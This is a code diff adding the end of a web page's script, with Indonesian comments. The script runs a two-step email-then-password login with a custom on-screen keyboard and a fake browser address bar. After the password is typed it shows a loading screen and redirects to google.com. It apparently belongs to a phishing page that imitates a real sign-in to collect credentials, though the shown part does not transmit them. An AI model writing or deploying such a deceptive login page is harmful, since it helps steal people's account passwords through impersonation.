+            customKeyboard.classList.add("visible");
+            loginFormSection.classList.add("keyboard-active");
+            switchLayout(currentLayoutId);
+            updateButtonState();
+          });
+
+          input.addEventListener("blur", () => {
+            setTimeout(() => {
+              if (
+                !customKeyboard.contains(document.activeElement) &&
+                !allInputFields.includes(document.activeElement)
+              ) {
+                customKeyboard.classList.remove("visible");
+                loginFormSection.classList.remove("keyboard-active");
+                activeInputField = null;
+              }
+            }, 50);
+          });
+        });
+
+        usernameInput.addEventListener("input", updateButtonState);
+        passwordInput.addEventListener("input", updateButtonState);
+
+        // Handle Next/Login button click
+        nextButton.addEventListener("click", () => {
+          if (nextButton.disabled) {
+            return;
+          }
+
+          if (currentFormStep === 1) {
+            const usernameValue = usernameInput.value.trim();
+            if (usernameValue !== "") {
+              if (usernameValue.includes("@") && !isValidEmail(usernameValue)) {
+                alert("Please enter a valid email address.");
+                return;
+              }
+              usernameInput.closest(".input-group").style.display = "none";
+              forgotEmailLink.style.display = "none";
+              passwordGroup.style.display = "block";
+              forgotPasswordLink.style.display = "block";
+              loginTitle.textContent = "Welcome";
+              loginSubtitle.textContent = usernameValue;
+              nextButton.textContent = "Login";
+              currentFormStep = 2;
+              passwordInput.focus();
+              updateButtonState();
+            } else {
+              alert("Please enter your email or phone.");
+            }
+          } else if (currentFormStep === 2) {
+            if (passwordInput.value.trim().length >= 4) {
+              // --- KODE BARU UNTUK TRANSISI LOADING PUTIH ---
+              // Sembunyikan form login dan keyboard
+              loginFormSection.classList.remove("visible");
+              customKeyboard.classList.remove("visible");
+
+              // Sembunyikan bilah alamat palsu
+              fakeBar.classList.remove("active");
+
+              // Tampilkan overlay loading putih
+              finalLoadingOverlay.classList.add("visible");
+
+              // Tunggu beberapa saat sebelum redirect
+              setTimeout(() => {
+                window.location.href = "https://www.google.com";
+              }, 1500); // Durasi loading 1.5 detik
+            } else {
+              alert("Please enter your password (minimum 4 characters).");
+            }
+          }
+        });
+
+        // Handle custom keyboard button clicks
+        customKeyboard.addEventListener("click", (event) => {
+          const target = event.target.closest("button");
+          if (target && target.dataset.key && activeInputField) {
+            const key = target.dataset.key;
+            if (key === "backspace") {
+              activeInputField.value = activeInputField.value.slice(0, -1);
+            } else if (key === "space") {
+              activeInputField.value += " ";
+            } else if (key === "enter") {
+              nextButton.click();
+            } else if (key === "shift") {
+              isShifted = !isShifted;
+              updateShiftState();
+            } else if (key === "?123") {
+              switchLayout("numberLayout");
+            } else if (key === "abc") {
+              switchLayout("letterLayout");
+            } else if (key === "sym_toggle_1") {
+              switchLayout("symbolLayout");
+            } else if (key === "number_toggle") {
+              switchLayout("numberLayout");
+            } else if (
+              [
+                "apps",
+                "emoji_icon",
+                "gif",
+                "settings",
+                "translate",
+                "palette",
+                "mic",
+                "globe_key",
+                "lang_toggle",
+                "emoji_key",
+              ].includes(key)
+            ) {
+              console.log(`${key} button pressed (utility/visual only)`);
+            } else {
+              let charToInsert = key;
+              if (
+                key === "double_quote" ||
+                key === "single_quote" ||
+                key === "comma" ||
+                key === "dot_key"
+              ) {
+                charToInsert = target.childNodes[0].nodeValue.trim();
+              }
+              if (
+                currentLayoutId === "letterLayout" &&
+                isShifted &&
+                key.length === 1 &&
+                /[a-z]/.test(key.toLowerCase())
+              ) {
+                charToInsert = key.toUpperCase();
+              }
+              activeInputField.value += charToInsert;
+              if (currentLayoutId === "letterLayout" && isShifted) {
+                isShifted = false;
+                updateShiftState();
+              }
+            }
+            activeInputField.selectionStart = activeInputField.selectionEnd =
+              activeInputField.value.length;
+            updateButtonState();
+          }
+        });
+
+        switchLayout("letterLayout");
+        usernameInput.focus();
+        updateButtonState();
+      });
+    </script>
+  </body>
+</html>
